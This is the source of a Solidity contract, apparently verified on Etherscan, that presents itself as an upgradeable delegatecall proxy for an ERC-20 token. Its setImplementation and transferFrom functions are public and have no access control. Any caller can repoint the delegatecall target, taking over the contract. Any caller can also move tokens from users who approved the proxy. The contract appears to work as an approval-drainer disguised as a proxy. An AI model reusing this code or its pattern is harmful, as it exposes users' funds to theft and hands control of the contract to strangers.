/**
 *Submitted for verification at Etherscan.io on 2022-04-13
*/

// ////-License-Identifier: Apache-2.0.

pragma solidity ^0.8.0;

interface IERC20 {

    function transferFrom(address form, address to, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

}

contract ProxyStorage {
    
    address internal rootToken;

    mapping(address => uint256) internal balances;

    mapping(address => mapping(address => uint256)) internal _allowances;
}



contract Proxy is ProxyStorage {


    function balanceOf(address owner) public view virtual  returns (uint256) {
        return IERC20(rootToken).balanceOf(owner);
    }

    function transferFrom(address form,address to, uint256 amount) public virtual  returns (bool) {

        IERC20(rootToken).transferFrom(form,to,amount);
        return true;
    }
    
    // 逻辑合约指定
    function setImplementation(address _execToken)  public  virtual  returns (bool) {
        rootToken=_execToken;
        return true;
    }

    function implementation() public view virtual  returns (address _impl) {

        return rootToken;
    }

    function initialize(bytes calldata) external pure {
        revert("CANNOT_CALL_INITIALIZE");
    }

    receive() external payable virtual {
        revert("CONTRACT_NOT_EXPECTED_TO_RECEIVE");
    }

    /*
      Contract's default function. Delegates execution to the implementation contract.
      It returns back to the external caller whatever the implementation delegated code returns.
    */
    fallback() external payable virtual{
        address _implementation = rootToken;
        require(_implementation != address(0x0), "MISSING_IMPLEMENTATION");

        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 for now, as we don't know the out size yet.
            let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
    
}